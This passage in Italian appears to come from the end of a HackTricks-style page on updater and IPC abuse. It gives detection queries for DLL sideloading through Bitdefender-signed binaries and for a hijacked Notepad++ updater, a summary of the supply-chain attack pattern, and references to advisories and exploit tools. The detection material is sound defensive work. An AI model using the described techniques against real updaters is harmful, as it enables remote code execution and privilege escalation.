| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> che avvia un installer diverso da quello di Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Questi pattern si applicano a qualsiasi updater che accetti manifest non firmati o non verifichi i firmatari dell’installer: hijack della rete + installer malevolo + sideloading firmato con un certificato proprio consentono l’esecuzione di codice da remoto sotto l’apparenza di aggiornamenti “trusted”.

---
## References
- [1] [Avviso – Netskope Client for Windows – Escalation dei privilegi locali tramite server rogue (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Avviso di sicurezza Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC di Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre e Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalation dei privilegi locali tramite file scrivibili in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalation dei privilegi nell’agent Windows](https://checkmk.com/werk/16361)
- [10] [PoC di sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Attori sponsorizzati da stati nazionali sfruttano la supply chain di Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aggiornamento sull’incidente di hijack dell’infrastruttura](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Elusione della correzione per CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Individuazione di bug di escalation dei privilegi in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: da gRPC a SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
